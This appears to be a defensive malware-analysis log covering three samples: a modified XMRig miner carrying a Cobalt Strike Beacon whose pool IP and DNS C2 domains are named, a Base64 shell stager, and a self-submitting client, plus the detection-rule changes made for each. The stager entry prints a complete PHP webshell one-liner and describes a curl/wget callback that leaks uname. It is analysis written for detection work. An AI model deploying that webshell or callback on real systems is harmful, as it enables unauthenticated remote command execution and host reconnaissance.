samples.identification: Modified XMRig with counted self-clone launcher, appended Go downloader and x86 Cobalt Strike Beacon
samples.marker: Modified XMRig: counted clone launches and embedded Beacon
evidence: PE64 entry 0x14009a338 reaches CRT main and modified main around 0x14002ade0. Native calls/control flow were inspected with Rizin and Capstone; no sample executed.

0x14002ae82 opens argv[0]; fread at 0x14002aed6 reads the complete own image. Tail DWORDs read at 0x14002aee5/0x14002aeea supply generation/count values. The loop writes generated copies, rewrites counters, calls CreateProcessW at 0x14002b01d, advances its stride and repeats. Very large text-derived footer values make successful propagation uncertain.

Embedded XMRig JSON enables cn/r mining at 3.120.209.58:8080 with user/pass x and donation zero. Ordinary mining alone is dual-use; the added self-clone launch loop and implant packaging tip MALICIOUS.

The appended PE at 0xfc400 has main.checkForAdmin 0x58ecd0, main.main 0x58ed20, main.GetArchive 0x58f220 and main.Extract 0x58f3b0. COFF symbols resolve call targets. Admin testing opens PHYSICALDRIVE0. The non-admin branch requests normal PowerShell Start-Process -Verb runAs elevation; this does not establish a UAC bypass.

Go main downloads an S3 ZIP to temp, extracts into C:/G DATA Security Software/, removes the ZIP, and starts AVK.exe. GetArchive calls os.Create, net/http.Get and io.Copy; Extract calls archive/zip.OpenReader, path checks, os.OpenFile and io.Copy. The remote ZIP was not fetched or executed and its contents cannot be inferred from the directory name.

The appended PE at 0x5b8601 exports _ReflectiveLoader@4. XOR-0x69 configuration at relative 0x2f228 decodes to DNS mode, port 443, 5000ms sleep, ns7/ns8/ns9.softline.top, Amazon-shaped paths/headers and rundll32 spawn paths. Existing Beacon/config/DNS identities are supported.

Beacon remote-memory code at 0x10005785 writes payload bytes via WriteProcessMemory and changes remote page permissions. Context-taking code uses SetThreadContext and ResumeThread at 0x1000634e/0x1000635e. ROR13/PEB resolution and encoded PowerShell launch templates support the retained suspicious findings.

Only three valid PE headers occur in the outer bytes: the outer miner and the two appended images. No traced outer call establishes activation of the appended images; retained findings describe embedded capabilities, not observed execution.

samples.identification: IFS/Base64 shell stager that writes a request-command PHP backdoor and leaks uname through an HTTP URL
samples.marker: PHP backdoor dropper: host callback; add bound-command detection
evidence: Outer command is echo plus IFS-expanded spaces, Base64 decoding, and a pipe into sh. Decoding was done as data, never by executing the sample.

Decoded shell first pipes an inner Base64 PHP body to base64 -d > a local .php filename. PHP is: <?php $c=$_GET['c']??'id'; echo shell_exec($c.' 2>&1');. The request parameter is passed unfiltered into a shell, with output and stderr returned to the requester. No authentication exists in this tiny source.

The shell then invokes curl -skm 20 with a webhook URL whose path contains $(uname -a|base64|tr ...). A wget fallback makes the same request if curl fails. Both disable TLS verification. This transmits full uname output, including the host name; the response is not a downloaded executable.

The unauthenticated backdoor, concealment and host callback tip MALICIOUS. Authorized exploit testing could explain the artifact, but no such deployment context is supplied. Webroot placement and runtime success are not established.

Added a binding-equality PHP AST matcher and connected it to the existing tiny request-command webshell rule. Intervening sanitization, reassignment, unrelated variables and local strings do not match.

Added a source/send-bound decoded curl/wget URL matcher, a suspicious concealed uname callback composite, and a notable Base64-to-PHP-file observation. Renamed the existing decoded client composite without changing its matcher because its old description incorrectly inferred downloading from any curl command.

Coverage limitation: original facts expose only the outer decoded shell text; the nested PHP is not emitted as a parsed child. Scanning the extracted shell emits and detects its PHP child. A shell composite requiring the PHP-only webshell leg was tried, but the validator rejects that same-file cross-type join as impossible; it was not shipped. Expanding to outer scope would mix unrelated files in archives and was rejected as unsafe.

The original remains at zero hostile findings. The extracted PHP now has one hostile webshell finding and one suspicious binding finding. File staging is notable; the host-report composite is suspicious without the missing parsed backdoor context. No unsupported third hostile behavior or duplicate signature was added to reach the 3-5 goal.

samples.identification: Rebuilt Rifaien self-submission client, with statically linked libcurl
samples.marker: Rifaien: self-only mutation/uploads; correct hostile overclaim
evidence: PE32 entry 0x401130 reaches CRT startup 0x401020 and main 0x4013a0. Constructor initialization is conventional CRT/optional libgcj handling. No TLS or resource activation directory exists.
GetModuleFileNameA at 0x4013ce and fopen(rb)/fread at 0x4013da/0x40142c read its complete own executable. Main scans for a ten-byte mutation-slot marker, then saves the immediately following offset.

Every 30000ms the loop chooses a numbered node 1..7, generates a random filename, overwrites sixteen bytes in its own-image data slot at 0x401551..0x40155e, and writes that mutated self-copy with fwrite at 0x401591.

curl_formadd binds the generated filename to multipart file[], together with node and submit fields. curl_easy_setopt configures the URL and HTTPPOST; curl_easy_perform at 0x401656 submits to a fixed upload endpoint. The response is discarded as application input. _unlink at 0x4016a5 deletes the temporary copy; success and error paths repeat.

This is a self-submission experiment. It submits its own bytes and provides no command dispatcher, victim-file acquisition, hostile file modification or startup installation in the traced application path. Repeated mutation warrants investigation but does not prove unauthorized execution on the receiver or theft.

The benign judgment follows positive control/data-flow evidence: what is read, mutated, sent and deleted. The historical VM-playground interpretation is consistent with the fixed upload endpoint, numbered nodes and console progress messages, but authorization and current server behavior remain unknown.

The shared hostile submission rule also matches this benign workflow. Corrected it to suspicious while preserving every byte predicate, API binding, native mutation finding and upload finding. A separately fetched original positive outside this batch retains both technique findings after the change.

Added the missing .text-section Rifaien identity variant and its consumers. This initially suppressed the accurate connect literal metadata through a broad tool exclusion. Removed only that metadata-level tool exclusion to preserve the observation; the socket-name consumer retains its own exclusions.

retention.result: Same mutation and multipart-submission predicates still match; only unsupported hostile severity changes to suspicious.
